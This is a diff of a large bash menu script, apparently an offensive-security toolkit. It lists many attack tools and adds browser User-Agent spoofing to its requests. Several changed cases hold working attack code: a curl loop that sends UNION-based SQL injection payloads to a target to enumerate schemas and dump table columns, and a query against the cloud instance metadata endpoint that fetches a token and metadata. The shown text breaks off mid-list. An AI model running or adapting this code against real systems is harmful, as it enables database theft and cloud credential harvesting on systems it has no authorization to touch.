"peach" "peda" "peepdf" "perl-image-exiftool" "perl-tftp" "pev" "php-mt-seed" "php-rfi-payload-decoder" "php-vulnerability-hunter" "plecost" "pompem" "posttester" "powersploit" "prometheus" "protos-sip" "proxychains-ng" "proxycheck" "proxyp" "proxytunnel" "pscan" "pshitt" "pwd-hash" "pwn" "pwntools" "py2exe" "pyew" "pyinstaller" "pyrasite" "pyrit" "python-utidylib" "python2-binaryornot" "python2-yara" "radamsa" "radare2" "radiography" "rarcrack" "rawr" "rcracki-mt" "rdesktop-brute" "reaver" "rebind" "recon-ng" "regeorg" "relay-scanner" "responder" "rfcat" "rfidiot" "rkhunter" "rlogin-scanner" "ropgadget" "ropper" "rrs" "rtlsdr-scanner" "rtp-flood" "ruby-msgpack" "ruby-ronin" "ruby-ronin-support" "ruby-uri-query_params" "rww-attack" "safecopy" "sakis3g" "sandy" "sasm" "sb0x" "sbd" "scalpel" "scanmem" "scapy" "schnappi-dhcp" "scout2" "scrapy" "scrounge-ntfs" "seat" "secure-delete" "sees" "sergio-proxy" "sessionlist" "set" "shellme" "siege" "silk" "simple-ducky" "simple-lan-scan" "sinfp" "sipp" "sipvicious" "skipfish" "skype-dump" "sleuthkit" "slowloris" "smali" "smartphone-pentest-framework" "smbexec" "smtp-fuzz" "smtp-user-enum" "smtp-vrfy" "sn00p" "snmp-fuzzer" "snoopy-ng" "snort" "snow" "socat" "soot" "spade" "spectools" "spiderfoot" "spiderpig-pdffuzzer" "spike" "spike-proxy" "splint" "sploitego" "sps" "sqid" "sqlmap" "sqlninja" "ssh-privkey-crack" "sshuttle" "ssl-hostname-resolver" "ssl-phuck3r" "ssldump" "sslh" "sslscan" "sslstrip" "sslyze" "starttls-mitm" "steghide" "stompy" "storm-ring" "stunnel" "subdomainer" "sulley" "suricata" "svn-extractor" "swaks" "synflood" "synscan" "sysdig" "sysinternals-suite" "t50" "tbear" "tcpcontrol-fuzzer" "tcpdump" "tcpextract" "tcpflow" "tcpreplay" "tcpwatch" "teardown" "tekdefense-automater" "termineter" "tftp-bruteforce" "tftp-fuzz" "tftp-proxy" "thc-ipv6" "thc-keyfinder" "thc-pptp-bruter" "thc-smartbrute" "thc-ssl-dos" "theharvester" "tiger" "tilt" "tinc" "tinyproxy" "tlsenum" "tor" "tor-autocircuit" "tor-browser-en" "torshammer" "torsocks" "traceroute" "trid" "trinity" "trixd00r" "truecrypt" "tsh" "tsh-sctp" "twofi" "u3-pwn" "ubertooth" "udis86" "uefi-firmware-parser" "ufo-wardriving" "umap" "umit" "unhide" "unicorn" "unicornscan" "unix-privesc-check" "unsecure" "upx" "username-anarchy" "usernamer" "uw-loveimap" "uw-offish" "uw-udpscan" "uw-zone" "v3n0m" "valgrind" "vanguard" "vega" "veil" "viper" "vivisect" "vnc-bypauth" "volatility" "w3af" "wapiti" "web-soul" "webhandler" "webpwn3r" "webshells" "websockify" "webspa" "websploit" "weevely" "wfuzz" "whatweb" "wi-feye" "wifi-honey" "wifi-monitor" "wifiphisher" "wig" "wikigen" "winexe" "winfo" "wireless-ids" "wireshark-cli" "wireshark-gtk" "wlan2eth" "wmat" "wol-e" "wpscan" "ws-attacker" "x-scan" "xcavator" "xf86-video-qxl-git" "xortool" "xsser" "xsss" "yara" "ycrawler" "yersinia" "zaproxy" "zmap" "zulu" "zzuf"
 		do
 			if [[ "$PIPO" != "" ]];
 			then
@@ -10360,7 +10362,7 @@ while true; do
 		done
 	;;
 	"2268")
-		select PIPO in $PYPAK
+		select PIPO in "0trace" "3proxy" "3proxy-win32" "42zip" "ace" "admid-pack" "afflib" "afpfs-ng" "against" "aiengine" "aimage" "air" "airgraph-ng" "american-fuzzy-lop" "androguard" "android-apktool" "android-ndk" "android-sdk-platform-tools" "android-sdk" "android-udev-rules" "arachni" "arduino" "argus" "argus-clients" "armitage" "arp-scan" "artillery" "asp-audit" "athena-ssl-scanner" "auto-xor-decryptor" "autopsy" "azazel" "b2sum" "backdoor-factory" "balbuzard" "bamf-framework" "batman-adv" "bbqsql" "bbrecon" "bed" "beef" "beholder" "bgp-md5crack" "bing-ip2hosts" "bing-lfi-rfi" "binwalk" "bios_memimage" "blackarch-menus" "bletchley" "bluebox-ng" "bluelog" "blueprint" "bmap-tools" "bob-the-butcher" "braa" "braces" "browser-fuzzer" "brutus" "bsdiff" "bss" "bt_audit" "bulk-extractor" "bully" "bunny" "burpsuite" "bvi" "cadaver" "canari" "capstone" "casefile" "centry" "cewl" "cflow" "check-weak-dh-ssh" "checkpwd" "checksec" "chiron" "chownat" "chrome-decode" "cidr2range" "ciphertest" "cirt-fuzzer" "cisco-auditing-tool" "cisco-global-exploiter" "cisco-ocs" "cisco-router-config" "cisco-scanner" "cisco-torch" "cisco5crack" "cisco7crack" "ciscos" "climber" "cloudsplaining" "clusterd" "cms-explorer" "cms-few" "codetective" "complemento" "conpot" "cookie-cadger" "cppcheck" "cpptest" "crackle" "create-ap" "creds" "creepy" "crunch" "cuckoo" "cupp" "cutycapt" "darkd0rk3r" "dbd" "dc3dd" "ddrescue" "device-pharmer" "dex2jar" "dff-scanner" "dhcpig" "dirb" "dirbuster" "dirs3arch" "dislocker" "dissector" "dizzy" "dmitry" "dns-spoof" "dns2geoip" "dns2tcp" "dnsa" "dnschef" "dnsmap" "dnsrecon" "dnsutils" "domain-analyzer" "dradis" "dripper" "dsd" "dsniff" "dumb0" "dump1090" "eapmd5pass" "easy-creds" "eazy" "edb" "eindeutig" "elettra" "elettra-gui" "elite-proxy-finder" "enabler" "ent" "enum-shares" "enum4linux" "erase-registrations" "ettercap" "exiv2" "exploit-db" "eyewitness" "facebot" "fakeap" "fakedns" "fakemail" "fang" "fern-wifi-cracker" "fierce" "fiked" "filibuster" "fimap" "findmyhash" "firmware-mod-kit" "fl0p" "flare" "flasm" "flawfinder" "flunym0us" "foremost" "fping" "fport" "fraud-bridge" "freeipmi" "freeradius" "fs-nyarl" "ftp-fuzz" "ftp-scanner" "ftp-spider" "fusil" "fuzzdb" "g72x++" "galleta" "gdb" "geoip" "ghost-phisher" "ghost-py" "gnuradio" "gnutls2" "goldeneye" "golismero" "goog-mail" "gqrx" "grabber" "gtalk-decode" "gtp-scan" "hackersh" "halberd" "halcyon" "hamster" "handle" "hasere" "hash-identifier" "hashcat" "hashcat-utils" "hasher" "hashid" "hashpump" "hashtag" "haystack" "hdcp-genkey" "hdmi-sniff" "heartbleed-honeypot" "hex2bin" "honeyd" "honssh" "host-extract" "hostbox-ssh" "hotpatch" "hotspotter" "hpfeeds" "hping" "http-enum" "http-fuzz" "http-put" "http-traceroute" "httpforge" "httping" "httprint-win32" "hulk" "hwk" "hydra" "hyenae" "hyperion" "ike-scan" "imagejs" "inception" "intercepter-ng" "interrogate" "intersect" "inundator" "iodine" "ip-https-tools" "iputils" "ipv6toolkit" "isr-form" "jad" "jboss-autopwn" "jd-gui" "jhead" "jigsaw" "john" "johnny" "joomscan" "js-beautify" "jsql" "junkie" "jynx2" "kalibrate-rtl" "kippo" "kismet" "kismet-earth" "kismet2earth" "klogger" "kolkata" "kraken" "laf" "lans" "latd" "lbd" "leo" "leroy-jenkins" "lfi-autopwn" "lfi-exploiter" "lfi-fuzzploit" "lfi-scanner" "lfi-sploiter" "lft" "liffy" "linenum" "linux-exploit-suggester" "list-urls" "logkeys" "loki" "lynis" "mac-robber" "macchanger" "maclookup" "magictree" "make-pdf" "malheur" "maligno" "maltego" "maltrieve" "malware-check-tool" "marc4dasm" "maskprocessor" "masscan" "mat" "md5deep" "mdbtools" "mdk3" "mdns-scan" "medusa" "melkor" "memdump" "metasploit" "miranda-upnp" "missionplanner" "mitmproxy" "mkbrutus" "moloch" "monocle" "mp3nema" "mptcp" "mptcp-abuse" "ms-sys" "mtr" "mutator" "mysql2sqlite" "nbtool" "ncrack" "nemesis" "netbios-share-scanner" "netcon" "netdiscover" "netmap" "netmask" "netscan" "netsniff-ng" "netzob" "ngrep" "nield" "nikto" "nipper" "nmap" "nsec3walker" "ntds-decode" "o-saft" "oat" "obfsproxy" "objection" "oclhashcat" "ocs" "ollydbg" "onesixtyone" "onionsearch" "onionshare" "openvas-cli" "openvas-libraries" "openvas-manager" "openvas-scanner" "origami" "ostinato" "owasp-bywaf" "owtf" "p0f" "pack" "packet-o-matic" "packeth" "packit" "padbuster" "panoptic" "paros" "parsero" "pasco" "passe-partout" "passivedns" "patator" "pathod" "pcredz" "pdf-parser" "pdfbook-analyzer" "pdfid" "pdfresurrect" "peach" "peda" "peepdf" "perl-image-exiftool" "perl-tftp" "pev" "php-mt-seed" "php-rfi-payload-decoder" "php-vulnerability-hunter" "plecost" "pompem" "posttester" "powersploit" "prometheus" "protos-sip" "proxychains-ng" "proxycheck" "proxyp" "proxytunnel" "pscan" "pshitt" "pwd-hash" "pwn" "pwntools" "py2exe" "pyew" "pyinstaller" "pyrasite" "pyrit" "python-utidylib" "python2-binaryornot" "python2-yara" "radamsa" "radare2" "radiography" "rarcrack" "rawr" "rcracki-mt" "rdesktop-brute" "reaver" "rebind" "recon-ng" "regeorg" "relay-scanner" "responder" "rfcat" "rfidiot" "rkhunter" "rlogin-scanner" "ropgadget" "ropper" "rrs" "rtlsdr-scanner" "rtp-flood" "ruby-msgpack" "ruby-ronin" "ruby-ronin-support" "ruby-uri-query_params" "rww-attack" "safecopy" "sakis3g" "sandy" "sasm" "sb0x" "sbd" "scalpel" "scanmem" "scapy" "schnappi-dhcp" "scout2" "scrapy" "scrounge-ntfs" "seat" "secure-delete" "sees" "sergio-proxy" "sessionlist" "set" "shellme" "siege" "silk" "simple-ducky" "simple-lan-scan" "sinfp" "sipp" "sipvicious" "skipfish" "skype-dump" "sleuthkit" "slowloris" "smali" "smartphone-pentest-framework" "smbexec" "smtp-fuzz" "smtp-user-enum" "smtp-vrfy" "sn00p" "snmp-fuzzer" "snoopy-ng" "snort" "snow" "socat" "soot" "spade" "spectools" "spiderfoot" "spiderpig-pdffuzzer" "spike" "spike-proxy" "splint" "sploitego" "sps" "sqid" "sqlmap" "sqlninja" "ssh-privkey-crack" "sshuttle" "ssl-hostname-resolver" "ssl-phuck3r" "ssldump" "sslh" "sslscan" "sslstrip" "sslyze" "starttls-mitm" "steghide" "stompy" "storm-ring" "stunnel" "subdomainer" "sulley" "suricata" "svn-extractor" "swaks" "synflood" "synscan" "sysdig" "sysinternals-suite" "t50" "tbear" "tcpcontrol-fuzzer" "tcpdump" "tcpextract" "tcpflow" "tcpreplay" "tcpwatch" "teardown" "tekdefense-automater" "termineter" "tftp-bruteforce" "tftp-fuzz" "tftp-proxy" "thc-ipv6" "thc-keyfinder" "thc-pptp-bruter" "thc-smartbrute" "thc-ssl-dos" "theharvester" "tiger" "tilt" "tinc" "tinyproxy" "tlsenum" "tor" "tor-autocircuit" "tor-browser-en" "torshammer" "torsocks" "traceroute" "trid" "trinity" "trixd00r" "truecrypt" "tsh" "tsh-sctp" "twofi" "u3-pwn" "ubertooth" "udis86" "uefi-firmware-parser" "ufo-wardriving" "umap" "umit" "unhide" "unicorn" "unicornscan" "unix-privesc-check" "unsecure" "upx" "username-anarchy" "usernamer" "uw-loveimap" "uw-offish" "uw-udpscan" "uw-zone" "v3n0m" "valgrind" "vanguard" "vega" "veil" "viper" "vivisect" "vnc-bypauth" "volatility" "w3af" "wapiti" "web-soul" "webhandler" "webpwn3r" "webshells" "websockify" "webspa" "websploit" "weevely" "wfuzz" "whatweb" "wi-feye" "wifi-honey" "wifi-monitor" "wifiphisher" "wig" "wikigen" "winexe" "winfo" "wireless-ids" "wireshark-cli" "wireshark-gtk" "wlan2eth" "wmat" "wol-e" "wpscan" "ws-attacker" "x-scan" "xcavator" "xf86-video-qxl-git" "xortool" "xsser" "xsss" "yara" "ycrawler" "yersinia" "zaproxy" "zmap" "zulu" "zzuf"
 		do
 			if [[ "$PIPO" != "" ]];
 			then
@@ -10437,7 +10439,7 @@ while true; do
 		Clona "thehackingsage/hacktronian"
 	;;
 	"2289")
-		select GEMO in $RUPAK
+		select GEMO in "activemodel" "activerecord" "activesupport" "addressable" "ansi" "apscanner" "apullo" "arp_scan" "" "async" "async-dns" "async-http" "async-io" "async-pool" "atomic" "benchmark" "bigdecimal" "brakeman" "bscan" "buftok" "bundler" "celluloid" "celluloid-io" "cgi" "cms_scanner" "colorize" "concurrent-ruby" "concurrent-ruby-edge" "console" "csv" "daemons" "date" "dawnscanner" "dbm" "delegate" "did_you_mean" "dockscan" "domain_name" "domains_scanner" "DrupalScan" "em-websocket" "equalizer" "erubis" "espeak-ruby" "etc" "ethon" "eventmachine" "execjs" "fast_port_scanner" "fcntl" "ffi" "ffi-compiler" "fiber-local" "fiddle" "fileutils" "forwardable" "gdbm" "get_process_mem" "getoptlong" "google-cloud-web_security_scanner" "hacker-gems" "ham" "hashie" "hashie-forbidden_attributes" "hitimes" "http" "http-accept" "http-cookie" "http-form_data" "http-parser" "http_parser.rb" "httpclient" "http_scanner" "i18n" "io-console" "ipaddr" "ipaddress" "irb" "json" "logger" "matrix" "maxmind-db" "mdless" "memoizable" "mime" "mime-types" "mime-types-data" "mini_exiftool" "minitest" "mojo_magick" "msfrpc-client" "msgpack" "multi_json" "multipart-post" "mustermann" "mutex_m" "naught" "net-http-digest_auth" "net-pop" "net-smtp" "net-telnet" "netrc" "network_scanner" "nio4r" "nokogiri" "observer" "oj" "open3" "openssl" "opt_parse_validator" "ostruct" "otr-activerecord" "parseconfig" "password_crack" "pkg-config" "portfinder" "portscanner" "power_assert" "prime" "protocol-hpack" "protocol-http" "protocol-http1" "protocol-http2" "pstore" "psych" "public_suffix" "qr4r" "racc" "rack" "rack-protection" "rake" "rchardet" "rdoc" "readline" "readline-ext" "recog" "reline" "rest-client" "rexml" "rpc-mapper" "rqrcode_core" "rss" "ruby-progressbar" "ruby_wifi_scanner" "ruby2_keywords" "rubydns" "rubygems-update" "rubyzip" "rushover" "scanny" "ScanSSL" "sdbm" "simple_oauth" "sinatra" "singleton" "slack-notifier" "smb-client" "snmp" "snmpdumper" "snmpscan" "spider" "sqlite3" "ssh-exec" "ssh_scan" "ssl_scan" "ssl_scanner" "stringio" "strscan" "sync" "term-ansicolor" "test-unit" "thin" "thread_safe" "tilt" "timeout" "timers" "tins" "tracer" "twitter" "typhoeus" "tzinfo" "uglifier" "unf" "unf_ext" "uri" "w3map" "webrick" "wordstress" "wpscan" "xmlrpc" "XSpear" "xss" "yajl-ruby" "yaml" "zeitwerk" "zlib" "zola"
 		do
 			if [[ "$GEMO" != "" ]];
 			then
@@ -10858,7 +10860,7 @@ while true; do
 			ENTFRM="$ENTSSL""$OFFSEC""blob/""$MEX""examples/"
 			ENTTO="$ENTRAW""$OFFSEC""$MEX""examples/"
 			echo "Select a file name from ""$ENTSSL""$OFFSEC""tree/""$MEX""examples"
-			select EXP in $(lynx -dump -listonly "$ENTSSL""$OFFSEC""tree/""$MEX""examples/" |  grep "$ENTFRM" | awk '{print $2}' | while read -r EXP; do echo "${EXP/$ENTFRM/}"; done)
+			select EXP in $(lynx -dump -listonly "$ENTSSL""$OFFSEC""tree/""$MEX""examples/" | grep "$ENTFRM" | awk '{print $2}' | while read -r EXP; do echo "${EXP/$ENTFRM/}"; done)
 			do
 				if [[ "$EXP" != "" ]];
 				then
@@ -11003,7 +11005,7 @@ while true; do
 		if [[ "$TIP" != "" ]];
 		then
 			export TOKEN=`curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" "$TIP/latest/api/token"`
-			curl $CURLANON -H "X-aws-ec2-metadata-token:$TOKEN" -v "$TIP/latest/meta-data"
+			curl $SHEADER $USERAGENT $CURLANON -H "X-aws-ec2-metadata-token:$TOKEN" -v "$TIP/latest/meta-data"
 		fi
 	;;
 	"2424")
@@ -12178,7 +12180,7 @@ while true; do
 				MFRO=""
 
 				echo "$PAR"" ""$UNION"" ""$SELECT"" version() -- -"
-				curl -v -k -X POST -d "$PAR"" ""$UNION"" ""$SELECT"" version() -- -" "$TIP"
+				curl $SHEADER $USERAGENT -v -k -X POST -d "$PAR"" ""$UNION"" ""$SELECT"" version() -- -" "$TIP"
 				for I in {1..9}
 				do
 					if [[ "$Q" == "" ]];
@@ -12188,7 +12190,7 @@ while true; do
 						Q="$Q""$I"","
 					fi
 					echo "$PAR"" ""$UNION"" ""$SELECT"" ""$Q""version() -- -"
-					curl -v -k -X POST -d "$PAR"" ""$UNION"" ""$SELECT ""$Q""version() -- -" "$TIP"
+					curl $SHEADER $USERAGENT -v -k -X POST -d "$PAR"" ""$UNION"" ""$SELECT ""$Q""version() -- -" "$TIP"
 				done
 				echo "Digit the position of version, if was the first occurence, digit 1, otherwise digit the position number ignoring other numbers"
 				echo "'1,2,8.0.15', the position will be 3 (ignoring the other numbers)"
@@ -12223,9 +12225,9 @@ while true; do
 							for B in $(seq 0 $FST)
 							do
 								echo "$PAR"" ""$UNION"" ""$SELECT"" ""$PES""$CONCAT""(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") ""$FROM"" INFORMATION_SCHEMA.COLUMNS ""$WHERE"" TABLE_SCHEMA != 'Information_Schema' ""$LIMIT"" ""$A"" ""$OFFSET"" ""$B"" -- -"
-								curl -v -k -X POST -d "$PAR"" ""$UNION"" ""$SELECT"" ""$PES""$CONCAT""(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") ""$FROM"" INFORMATION_SCHEMA.COLUMNS ""$WHERE"" TABLE_SCHEMA != 'Information_Schema' ""$LIMIT"" ""$A"" ""$OFFSET"" ""$B"" -- -" "$TIP"
+								curl $SHEADER $USERAGENT -v -k -X POST -d "$PAR"" ""$UNION"" ""$SELECT"" ""$PES""$CONCAT""(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") ""$FROM"" INFORMATION_SCHEMA.COLUMNS ""$WHERE"" TABLE_SCHEMA != 'Information_Schema' ""$LIMIT"" ""$A"" ""$OFFSET"" ""$B"" -- -" "$TIP"
 								##echo "$PAR"" ""$UNION"" ""$SELECT"" ""$PES""$CONCAT""(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") ""$FROM"" INFORMATION_SCHEMA.COLUMNS ""$WHERE"" TABLE_SCHEMA != 'Information_Schema' ""$LIMIT"" ""$A"" ""$OFFSET"" ""$B"" -- -"
-								##curl -v -k -X POST -d "$PAR"" ""$UNINON"" ""$SELECT"" ""$PES""$CONCAT""(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") ""$FROM"" INFORMATION_SCHEMA.COLUMNS ""$LIMIT"" ""$A"" ""$OFFSET"" ""$B"" -- -" "$TIP"
+								##curl $SHEADER $USERAGENT -v -k -X POST -d "$PAR"" ""$UNINON"" ""$SELECT"" ""$PES""$CONCAT""(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") ""$FROM"" INFORMATION_SCHEMA.COLUMNS ""$LIMIT"" ""$A"" ""$OFFSET"" ""$B"" -- -" "$TIP"
 							done
 						done
 					else
@@ -12234,9 +12236,9 @@ while true; do
 							for B in $(seq 0 $FST)
 							do
 								echo "$PAR"" ""$UNION"" ""$SELECT"" ""$CONCAT""(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") ""$FROM"" INFORMATION_SCHEMA.COLUMNS ""$WHERE"" TABLE_SCHEMA != 'Information_Schema' ""$LIMIT"" ""$A"" ""$OFFSET"" ""$B"" -- -"
-								curl -v -k -X POST -d "$PAR"" ""$UNION"" ""$SELECT"" ""$CONCAT""(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") ""$FROM"" INFORMATION_SCHEMA.COLUMNS ""$WHERE"" TABLE_SCHEMA != 'Information_Schema' ""$LIMIT"" ""$A"" ""$OFFSET"" ""$B"" -- -" "$TIP"
+								curl $SHEADER $USERAGENT -v -k -X POST -d "$PAR"" ""$UNION"" ""$SELECT"" ""$CONCAT""(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") ""$FROM"" INFORMATION_SCHEMA.COLUMNS ""$WHERE"" TABLE_SCHEMA != 'Information_Schema' ""$LIMIT"" ""$A"" ""$OFFSET"" ""$B"" -- -" "$TIP"
 								##echo "$PAR"" ""$UNION"" ""$SELECT"" ""$CONCAT""(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") ""$FROM"" INFORMATION_SCHEMA.COLUMNS ""$LIMIT"" ""$A"" ""$OFFSET"" ""$B"" -- -"
-								##curl -v -k -X POST -d "$PAR"" ""$UNION"" ""$SELECT"" ""$CONCAT""(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") ""$FROM"" INFORMATION_SCHEMA.COLUMNS ""$LIMIT"" ""$A"" ""$OFFSET"" ""$B"" -- -" "$TIP"
+								##curl $SHEADER $USERAGENT -v -k -X POST -d "$PAR"" ""$UNION"" ""$SELECT"" ""$CONCAT""(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") ""$FROM"" INFORMATION_SCHEMA.COLUMNS ""$LIMIT"" ""$A"" ""$OFFSET"" ""$B"" -- -" "$TIP"
 							done
 						done
 					fi
@@ -12256,7 +12258,7 @@ while true; do
 								then
 									if [[ "$CLMN" != "quit" ]];
 									then
-										curl -v -k -X POST -d "$PAR"" ""$UNION"" ""$SELECT"" ""$CONCAT""(""$CLMN"") ""$FROM"" ""$TBLN"" -- -" "$TIP"
+										curl $SHEADER $USERAGENT -v -k -X POST -d "$PAR"" ""$UNION"" ""$SELECT"" ""$CONCAT""(""$CLMN"") ""$FROM"" ""$TBLN"" -- -" "$TIP"
 									fi
 								fi
 							fi
@@ -12630,7 +12632,7 @@ while true; do
 			read -p "(example, 0x29a): " XOR
 			if [[ "$XOR" != "" ]];
 			then
-				echo  -e "from pwn import *\n\ntxt=list(\"""$TXT""\")\nprint(txt)\no=0\narray=[]\nfor a in txt:\n\tarray.append(ord(a))\n\to=o+1\nxored = \"\"\nfor i in array:\n\txored += (chr(i ^ ""$XOR""))\n\nprint(xored)"|python
+				echo -e "from pwn import *\n\ntxt=list(\"""$TXT""\")\nprint(txt)\no=0\narray=[]\nfor a in txt:\n\tarray.append(ord(a))\n\to=o+1\nxored = \"\"\nfor i in array:\n\txored += (chr(i ^ ""$XOR""))\n\nprint(xored)"|python
 			fi
 		fi
 	;;
@@ -12643,7 +12645,7 @@ while true; do
 			read -p "(example, 0x29a): " XOR
 			if [[ "$XOR" != "" ]];
 			then
-				echo  -e "from pwn import *\n\narray=[""$TXT""]\nxored = \"\"\nfor i in array:\n\txored += (chr(i ^ ""$XOR""))\n\nprint(xored)"|python
+				echo -e "from pwn import *\n\narray=[""$TXT""]\nxored = \"\"\nfor i in array:\n\txored += (chr(i ^ ""$XOR""))\n\nprint(xored)"|python
 			fi
 		fi
 	;;
@@ -12656,7 +12658,7 @@ while true; do
 			read -p "(example, 0x29a): " SAND
 			if [[ "$SAND" != "" ]];
 			then
-				echo  -e "from pwn import *\n\narray=[""$TXT""]\nxored = \"\"\nfor i in array:\n\txored += (chr(i & ""$SAND""))\n\nprint(xored)"|python
+				echo -e "from pwn import *\n\narray=[""$TXT""]\nxored = \"\"\nfor i in array:\n\txored += (chr(i & ""$SAND""))\n\nprint(xored)"|python
 			fi
 		fi
 	;;
@@ -12669,7 +12671,7 @@ while true; do
 			read -p "(example, 0x29a): " SOR
 			if [[ "$SOR" != "" ]];
 			then
-				echo  -e "from pwn import *\n\narray=[""$TXT""]\nxored = \"\"\nfor i in array:\n\txored += (chr(i | ""$SOR""))\n\nprint(xored)"|python
+				echo -e "from pwn import *\n\narray=[""$TXT""]\nxored = \"\"\nfor i in array:\n\txored += (chr(i | ""$SOR""))\n\nprint(xored)"|python
 			fi
 		fi
 	;;
@@ -12682,7 +12684,7 @@ while true; do
 			read -p "(example, 0x29a): " SAND
 			if [[ "$SAND" != "" ]];
 			then
-				echo  -e "from pwn import *\n\ntxt=list(\"""$TXT""\")\nprint(txt)\no=0\narray=[]\nfor a in txt:\n\tarray.append(ord(a))\n\to=o+1\nxored = \"\"\nfor i in array:\n\txored += (chr(i & ""$SAND""))\n\nprint(xored)"|python
+				echo -e "from pwn import *\n\ntxt=list(\"""$TXT""\")\nprint(txt)\no=0\narray=[]\nfor a in txt:\n\tarray.append(ord(a))\n\to=o+1\nxored = \"\"\nfor i in array:\n\txored += (chr(i & ""$SAND""))\n\nprint(xored)"|python
 			fi
 		fi
 	;;
@@ -12695,9 +12697,55 @@ while true; do
 			read -p "(example, 0x29a): " SOR
 			if [[ "$SOR" != "" ]];
 			then
-				echo  -e "from pwn import *\n\ntxt=list(\"""$TXT""\")\nprint(txt)\no=0\narray=[]\nfor a in txt:\n\tarray.append(ord(a))\n\to=o+1\nxored = \"\"\nfor i in array:\n\txored += (chr(i | ""$SOR""))\n\nprint(xored)"|python
+				echo -e "from pwn import *\n\ntxt=list(\"""$TXT""\")\nprint(txt)\no=0\narray=[]\nfor a in txt:\n\tarray.append(ord(a))\n\to=o+1\nxored = \"\"\nfor i in array:\n\txored += (chr(i | ""$SOR""))\n\nprint(xored)"|python
 			fi
 		fi
+	;;
+	"2654")
+		echo "Digit a valid User-Agent or select from list, exit to quit the selection"
+		select CHOICE in "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36" "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/98.0.4758.97 Mobile/15E148 Safari/604.1" "Mozilla/5.0 (iPad; CPU OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/98.0.4758.97 Mobile/15E148 Safari/604.1" "Mozilla/5.0 (iPod; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/98.0.4758.97 Mobile/15E148 Safari/604.1" "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36" "Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36" "Mozilla/5.0 (Linux; Android 10; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0" "Mozilla/5.0 (Macintosh; Intel Mac OS X 12.2; rv:97.0) Gecko/20100101 Firefox/97.0" "Mozilla/5.0 (X11; Linux i686; rv:97.0) Gecko/20100101 Firefox/97.0" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/97.0 Mobile/15E148 Safari/605.1.15" "Mozilla/5.0 (iPad; CPU OS 12_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/97.0 Mobile/15E148 Safari/605.1.15" "Mozilla/5.0 (iPod touch; CPU iPhone OS 12_2_1 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) FxiOS/97.0 Mobile/15E148 Safari/605.1.15" "Mozilla/5.0 (Android 12; Mobile; rv:68.0) Gecko/68.0 Firefox/97.0" "Mozilla/5.0 (Android 12; Mobile; LG-M255; rv:97.0) Gecko/97.0 Firefox/97.0" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0" "Mozilla/5.0 (Macintosh; Intel Mac OS X 12.2; rv:91.0) Gecko/20100101 Firefox/91.0" "Mozilla/5.0 (X11; Linux i686; rv:91.0) Gecko/20100101 Firefox/91.0" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 OPR/83.0.4254.27" "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 OPR/83.0.4254.27" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 OPR/83.0.4254.27" "Mozilla/5.0 (Linux; Android 10; VOG-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36 OPR/63.3.3216.58675" "Mozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36 OPR/63.3.3216.58675" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Brave Chrome/83.0.4103.116 Safari/537.36" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 Edg/97.0.1072.69" "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 Edg/97.0.1072.69" 